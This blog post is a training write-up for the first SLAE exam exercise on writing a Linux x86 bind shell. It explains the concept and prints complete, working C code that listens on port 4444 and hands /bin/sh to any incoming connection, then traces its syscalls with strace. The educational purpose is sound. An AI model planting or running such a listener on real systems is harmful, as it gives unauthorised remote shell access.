---
layout: post
title: SLAE Exercise 1 - Bind Shell
subtitle: Linux x86 Bind Shell
tags: [SLAE]
---

**Overview**

The first task of the SLAE exam requires a bind shell to be written. The requirements for this were as follows:
	- Binds to a port.
	- Executes a shell on an incoming connection.
	- The port number should be easily configurable within the shell code. 

**Requirements**

To start, it is best to find out what is needed to create a bind shell in a higher level language, and how each of all of these components work. First of all, what is a bind shell?  A bind shell is a shell that binds to a specific port on the target that listens to incoming connections. When a device connects to this port, a shell will be presented. So what is needed from a bind shell? It needs to:

- Be waiting for an incoming connection - bind to a port. 
- Provide the incoming connection with a shell by utilising execve (syscall 11). 

The following C taken from [here] (https://azeria-labs.com/tcp-bind-shell-in-assembly-arm-32-bit/), was utilised to determine what was needed to create a bind shell:

~~~
#include <stdio.h> 
#include <sys/types.h>  
#include <sys/socket.h> 
#include <netinet/in.h> 
int host_sockid;    // socket file descriptor 
int client_sockid;  // client file descriptor 
struct sockaddr_in hostaddr;            // server aka listen address
int main() 
{ 
    // Create new TCP socket 
    host_sockid = socket(PF_INET, SOCK_STREAM, 0); 
    // Initialize sockaddr struct to bind socket using it 
    hostaddr.sin_family = AF_INET;                  // server socket type address family = internet protocol address
    hostaddr.sin_port = htons(4444);                // server port, converted to network byte order
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);   // listen to any address, converted to network byte order
    // Bind socket to IP/Port in sockaddr struct 
    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr)); 
    // Listen for incoming connections 
    listen(host_sockid, 2); 
    // Accept incoming connection 
    client_sockid = accept(host_sockid, NULL, NULL); 
    // Duplicate file descriptors for STDIN, STDOUT and STDERR 
    dup2(client_sockid, 0); 
    dup2(client_sockid, 1); 
    dup2(client_sockid, 2); 
    // Execute /bin/sh 
    execve("/bin/sh", NULL, NULL); 
    close(host_sockid); 
    return 0; 
}
~~~

Using Strace along with the complied C bind shell, it can be seen exactly what Syscalls are required to write a bind shell. The command to run the program with strace was as follows:
~~~
	Sudo strace ./bind
~~~
The open port was connected to so that the entirety of the program running could be observed with strace. The following was observed:

![Crepe](https://image.ibb.co/gQbbNn/C_Bind_Strace.png)


![Alt Text](https://image.ibb.co/gQbbNn/C_Bind_Strace.png)
Local Image(./img/SLAE_Bind/C_Bind_Strace.png)
